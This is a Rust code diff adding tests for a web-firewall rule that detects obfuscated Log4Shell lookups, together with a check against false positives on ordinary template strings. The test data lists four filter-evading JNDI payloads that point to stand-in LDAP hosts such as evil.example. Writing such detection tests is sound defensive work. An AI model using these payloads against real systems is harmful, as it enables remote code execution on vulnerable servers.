@@ -147,6 +147,49 @@ fn java_spring4shell_param_name() {
     });
 }
 
+// ── E-1: Log4Shell lookup-obfuscation (bypass of the literal 9000003) ──────────
+
+#[test]
+fn java_log4shell_obfuscation() {
+    // Each of these reconstructs `jndi`/the scheme through nested Log4j lookups, so the
+    // literal `${jndi:ldap:` rule (9000003) never sees it — but 9000004 catches the
+    // obfuscation primitives. Placed across header and query to exercise the wider surface.
+    let obfuscations = [
+        "${${lower:j}ndi:ldap://evil.example/a}",       // nested lookup builds `j`
+        "${::-j}${::-n}${::-d}${::-i}:ldap://evil/a}",   // empty-name default, char by char
+        "${env:BAR:-j}ndi:ldap://evil/a}",              // env default builds `j`
+        "${jndi:${lower:l}dap://evil/a}",               // literal ${jndi: but scheme obfuscated
+    ];
+    for (i, payload) in obfuscations.iter().enumerate() {
+        // odd index → header, even → query, so both surfaces are covered.
+        if i % 2 == 0 {
+            assert_fires("crs-9000004", Severity::Critical, |c| {
+                c.headers = vec![("X-Api-Version".to_string(), payload.to_string())];
+            });
+        } else {
+            assert_fires("crs-9000004", Severity::Critical, |c| {
+                c.query = Some(format!("x={payload}"));
+            });
+        }
+    }
+}
+
+#[test]
+fn java_log4shell_obfuscation_no_false_positive_on_benign_templates() {
+    // FP guard: ordinary `${…}` template/interpolation syntax carries none of the Log4j
+    // obfuscation primitives (nested `${`, a lookup keyword, or an empty-name `${:-`) and
+    // must NOT trip 9000004.
+    for benign in ["${user.name}", "${price}", "${1 + 1}", "${price:-0}"] {
+        let mut c = ctx();
+        c.query = Some(format!("tpl={benign}"));
+        assert_eq!(
+            fired(&module().inspect(&c), "crs-9000004"),
+            None,
+            "9000004 false-positive on benign template {benign:?}"
+        );
+    }
+}
+
 // ── CVE signatures (9100000+) ──────────────────────────────────────────────────
 
 fn set_uri(c: &mut RequestContext, path: &str, query: &str) {
